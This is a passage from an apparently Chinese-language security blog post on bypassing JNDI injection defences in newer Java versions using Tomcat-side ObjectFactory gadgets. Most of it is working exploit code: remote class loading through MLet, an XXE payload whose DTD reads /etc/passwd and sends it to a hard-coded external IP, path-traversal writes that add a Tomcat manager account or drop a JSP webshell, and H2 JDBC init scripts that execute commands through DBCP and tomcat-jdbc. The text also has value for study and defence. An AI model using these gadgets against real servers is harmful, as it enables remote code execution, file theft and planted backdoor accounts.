class="hljs-string">&quot;a=loadClass,b=addURL,c=loadClass&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:2333/&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;Blue&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br><span class="hljs-comment">//等同于</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">MLet mLet = new MLet();</span><br><span class="hljs-comment">mLet.addURL(&quot;http://127.0.0.1:2333/&quot;);</span><br><span class="hljs-comment">mLet.loadClass(&quot;Exploit&quot;);</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="com-sun-glass-utils-NativeLibLoader-外部库加载RCE"><a href="#com-sun-glass-utils-NativeLibLoader-外部库加载RCE" class="headerlink" title="com.sun.glass.utils.NativeLibLoader#() [外部库加载RCE]"></a>com.sun.glass.utils.<strong>NativeLibLoader</strong>#() [外部库加载RCE]</h2><p>参考：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1489%EF%BC%8C%E6%9C%89%E5%8F%AF%E7%94%A8%E7%9A%84%E4%B8%8A%E4%BC%A0%E6%8E%A5%E5%8F%A3%E6%AF%94%E8%BE%83%E6%96%B9%E4%BE%BF%EF%BC%8C%E7%A8%B3%E5%AE%9A%E5%AE%9E%E7%8E%B0%E8%BE%83%E5%A4%8D%E6%9D%82%E3%80%82">https://tttang.com/archive/1489，有可用的上传接口比较方便，稳定实现较复杂。</a></p>
+<h1 id="利用MemoryUserDatabaseFactory"><a href="#利用MemoryUserDatabaseFactory" class="headerlink" title="利用MemoryUserDatabaseFactory"></a>利用MemoryUserDatabaseFactory</h1><p> 这个类也实现了ObjectFactory，其getObjectInstance()方法调用一系列setter对pathname、readOnly等属性赋值，然后就会调用open()方法，如果readOnly为false则调用save()进行存储。</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827114744484.png" srcset="/img/loading.gif" lazyload class="" title="image-20230827114744484">
+
+<p>首先看open()方法：</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827155857948.png" srcset="/img/loading.gif" lazyload class="" title="image-20230827155857948">
+
+<p>open()方法会把pathname转换为URI并发起连接请求，然后使用Digester进行XML解析。</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827160143774.png" srcset="/img/loading.gif" lazyload class="" title="image-20230827160143774">
+
+<p>再看save()，它则是直接打开了写入流，将XML解析出来的role、user等键值写入，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getReadonly()) &#123;<br>            log.error(sm.getString(<span class="hljs-string">&quot;memoryUserDatabase.readOnly&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isWriteable()) &#123;<br>            log.warn(sm.getString(<span class="hljs-string">&quot;memoryUserDatabase.notPersistable&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">fileNew</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.pathnameNew);<br>            <span class="hljs-keyword">if</span> (!fileNew.isAbsolute()) &#123;<br>                fileNew = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(System.getProperty(<span class="hljs-string">&quot;catalina.base&quot;</span>), <span class="hljs-built_in">this</span>.pathnameNew);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.writeLock.lock();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fileNew);<br>                    <span class="hljs-type">Throwable</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(fos, <span class="hljs-string">&quot;UTF8&quot;</span>);<br>                        <span class="hljs-type">Throwable</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(osw);<br>                            <span class="hljs-type">Throwable</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.println(<span class="hljs-string">&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;&lt;tomcat-users xmlns=\&quot;http://tomcat.apache.org/xml\&quot;&quot;</span>);<br>                                writer.print(<span class="hljs-string">&quot;              &quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;&quot;</span>);<br>                                writer.print(<span class="hljs-string">&quot;              &quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;xsi:schemaLocation=\&quot;http://tomcat.apache.org/xml tomcat-users.xsd\&quot;&quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;              version=\&quot;1.0\&quot;&gt;&quot;</span>);<br>                                Iterator&lt;?&gt; values = <span class="hljs-literal">null</span>;<br>                                values = <span class="hljs-built_in">this</span>.getRoles();<br><br>                                <span class="hljs-keyword">while</span>(values.hasNext()) &#123;<br>                                    writer.print(<span class="hljs-string">&quot;  &quot;</span>);<br>                                    writer.println(values.next());<br>                                &#125;<br><br>                                values = <span class="hljs-built_in">this</span>.getGroups();<br><br>                                <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>                                    <span class="hljs-keyword">if</span> (!values.hasNext()) &#123;<br>                                        values = <span class="hljs-built_in">this</span>.getUsers();<br><br>                                        <span class="hljs-keyword">while</span>(values.hasNext()) &#123;<br>                                            writer.print(<span class="hljs-string">&quot;  &quot;</span>);<br>                                            writer.println(((MemoryUser)values.next()).toXml());<br>                                        &#125;<br><br>                                        writer.println(<span class="hljs-string">&quot;&lt;/tomcat-users&gt;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>既然发起远程连接并且对XML进行了解析，那就存在XXE漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;pathname&quot;</span>,<span class="hljs-string">&quot;http://vps:port/exp.xml&quot;</span>));<br><span class="hljs-keyword">return</span> resourceRef;<br><br><span class="hljs-comment">/**exp.xml </span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE data SYSTEM &quot;http://101.33.203.2:8000/oob.dtd&quot;&gt;</span><br><span class="hljs-comment">&lt;data&gt;&amp;send;&lt;/data&gt;</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-comment">/**oob.dtd</span><br><span class="hljs-comment">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-comment">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://101.33.203.2:5000/?%file;&#x27;&gt;&quot;&gt;</span><br><span class="hljs-comment">%all;</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="添加后台用户"><a href="#添加后台用户" class="headerlink" title="添加后台用户"></a>添加后台用户</h3><p>Tomcat后台用户的账户密码在文件<code>&lt;CATALINA.BASE&gt;/conf/tomcat-users.xml</code>中可以进行配置，相关配置内容是</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;tomcat,role1,manager-gui,manager-script,manager-jmx,manager,admin-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;both&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;tomcat,role1,manager-gui,manager-script,manager-jmx,manager,admin-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;role1&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;role1&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>前面讲到open()时提到，它会把XML解析出来的账户直接写入，写入的内容我们可控，写入路径这里我们就遇到问题了，写入路径的处理逻辑是直接拼接catalina根目录与pathname：<code> fileNew = new File(System.getProperty(&quot;catalina.base&quot;), this.pathnameNew);</code>，但我们使用远程URI的话就会出现<code>http://</code>等字符，拼接出来就是<code>&lt;CATALINA.BASE&gt;/http://1.1.1.1:2222/conf/tomcat-users.xml</code>，这时路径不存在是非法的，这时候就可以使用路径穿越的方式获取到xml文件：<code>&lt;CATALINA.BASE&gt;/http://1.1.1.1:2222/../../conf/tomcat-users.xml</code>。</p>
+<p>这时候还有一个问题，那就是路径<code>http:/1.1.1.1:2222</code>不存在，路径穿越也是不合法的，解决的办法就是借用创建目录的方法将<code>http:/1.1.1.1:2222</code>创建出来，这里使用到的是org.h2.store.fs.FileUtils#createDirectory()。最后就可以覆盖tomcat-users.xml了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//step1: create dir</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatMkdirFrist</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.h2.store.fs.FileUtils&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=createDirectory&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;../http:&quot;</span>)); <span class="hljs-comment">//工作目录在CATALINA.BASE/bin因此目录要往前跳一级。</span><br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatMkdirLast</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.h2.store.fs.FileUtils&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=createDirectory&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;../http:/vps:8888&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><br><span class="hljs-comment">//step2: write in user fake_manager:123456</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatManagerAdd</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;pathname&quot;</span>, <span class="hljs-string">&quot;http://vps:8888/../../conf/tomcat-users.xml&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><br><span class="hljs-comment">/** tomcat-users.xml in http://vps:8888/conf/tomcat-users.xml</span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="hljs-comment">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="hljs-comment">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="hljs-comment">              version=&quot;1.0&quot;&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;tomcat&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;role1&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;manager&quot;/&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">  &lt;user username=&quot;fake_manager&quot; password=&quot;123456&quot; roles=&quot;tomcat,role1,manager-gui,manager-script,manager-jmx,manager,admin-gui&quot;/&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;/tomcat-users&gt;</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
+
+<p>然后就是进后台部署war，不多说。</p>
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>上一小节其实已经实现了任意文件写，因此也可以直接向网站根目录写入webshell，原理一样。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//step1 create dir ...</span><br><br><span class="hljs-comment">//step2 write in </span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">tomcatWriteFile</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.apache.catalina.UserDatabase&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;pathname&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br><br><span class="hljs-comment">/** shell.jsp in http://vps:8888/webapps/ROOT/test.jsp</span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="hljs-comment">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="hljs-comment">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="hljs-comment">              version=&quot;1.0&quot;&gt;</span><br><span class="hljs-comment">  &lt;role rolename=&quot;&amp;#x3c;%Runtime.getRuntime().exec(&amp;#x22;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#x22;); %&amp;#x3e;&quot;/&gt;</span><br><span class="hljs-comment">&lt;/tomcat-users&gt;</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="利用JDBC"><a href="#利用JDBC" class="headerlink" title="利用JDBC"></a>利用JDBC</h1><h3 id="dbcp"><a href="#dbcp" class="headerlink" title="dbcp"></a>dbcp</h3><p>同样的还是找ObjectFactory，利用JDBC可以主动发起恶意数据库连接，只需要一个String类型的参数即可，注意类<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory</code>，其getObjectInstance()方法经过层层调用会来到<code>BasicDataSource#createDataSource()</code>即发起数据库连接。</p>
+<p>dbcp工厂类要依据本地classpath依赖来决定，存在多种，比如不是Tomcat时可以尝试使用commons-dbcp。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">tomcat_dbcp2_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">tomcat_dbcp1_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">commons_dbcp2_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">commons_dbcp1_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">dbcpByFactory</span><span class="hljs-params">(String factory)</span>&#123;<br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="tomcat-jdbc"><a href="#tomcat-jdbc" class="headerlink" title="tomcat-jdbc"></a>tomcat-jdbc</h3><p>dbcp用不了时，可以尝试tomcat-jdbc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">tomcat_JDBC_RCE</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> dbcpByFactory(<span class="hljs-string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">dbcpByFactory</span><span class="hljs-params">(String factory)</span>&#123;<br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,<span 